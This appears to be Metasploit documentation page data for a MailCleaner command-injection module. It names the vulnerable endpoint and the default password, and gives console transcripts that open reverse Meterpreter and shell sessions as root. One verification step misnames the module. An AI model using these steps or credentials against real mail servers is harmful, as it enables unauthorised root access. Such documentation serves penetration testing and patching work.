{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/mailcleaner_exec","result":{"data":{"moduleMetadataJson":{"id":"8b89a948-cb77-534b-96f3-b4206d68884f","name":"Mailcleaner Remote Code Execution","fullname":"exploit/linux/http/mailcleaner_exec","description":"This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an\n        operating system command under the context of the web server user which is root.\n\n        /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing\n        operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/mailcleaner_exec","documentationSlug":"/modules/documentation/exploit/linux/http/mailcleaner_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an operating system command under the context of the web server user which is root.</p>\n<h3 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h3>\n<p>You can download ISO file from following URL.\n<a href=\"https://www.mailcleaner.org/latest-downloads/\">https://www.mailcleaner.org/latest-downloads/</a></p>\n<p>At the time of this writing all the passwords of users such as root or admin user was \"MCPassw0rd\".</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use use exploit/linux/http/mailcleaner</code></li>\n<li>Set <code class=\"language-text\">RHOST</code></li>\n<li>Set <code class=\"language-text\">LHOST</code></li>\n<li>Set <code class=\"language-text\">USERNAME</code></li>\n<li>Set <code class=\"language-text\">PASSWORD</code></li>\n<li>Run <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Awesome..! Authenticated</code>.</li>\n<li><strong>Verify</strong> that you are getting <code class=\"language-text\">meterpreter</code> session.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/mailcleaner_exec \nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set RHOSTS 12.0.0.100\nRHOSTS =&gt; 12.0.0.100\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set LHOST 12.0.0.1\nLHOST =&gt; 12.0.0.1\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set PASSWORD &lt;password&gt;\nPASSWORD =&gt; qwe123\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; run\n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Performing authentication...\n[+] Awesome..! Authenticated with admin:&lt;password&gt;\n[*] Exploiting command injection flaw\n[*] Sending stage (53508 bytes) to 12.0.0.100\n[*] Meterpreter session 1 opened (12.0.0.1:4444 -&gt; 12.0.0.100:44974) at 2018-12-19 17:24:44 +0300\n[*] Sending stage (53508 bytes) to 12.0.0.100\n[*] Meterpreter session 2 opened (12.0.0.1:4444 -&gt; 12.0.0.100:44975) at 2018-12-19 17:24:45 +0300\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>You can also use cmd payloads.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/mailcleaner_exec \nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set RHOSTS 12.0.0.100\nRHOSTS =&gt; 12.0.0.100\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set LHOST 12.0.0.1\nLHOST =&gt; 12.0.0.1\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set PASSWORD &lt;password&gt;\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set target 1\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; set payload cmd/unix/reverse\npayload =&gt; cmd/unix/reverse\nmsf5 exploit(linux/http/mailcleaner_exec) &gt; run\n\n[*] Started reverse TCP double handler on 12.0.0.1:4444 \n[*] Performing authentication...\n[+] Awesome..! Authenticated with admin:MCPassw0rd\n[*] Exploiting command injection flaw\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo P6zixt2asYXZ29NE;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: &quot;P6zixt2asYXZ29NE\\r\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 2 opened (12.0.0.1:4444 -&gt; 12.0.0.100:53996) at 2018-12-20 12:09:32 +0300\n\nid\nuid=0(root) gid=1003(mailcleaner) groups=1003(mailcleaner)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8b89a948-cb77-534b-96f3-b4206d68884f"}}}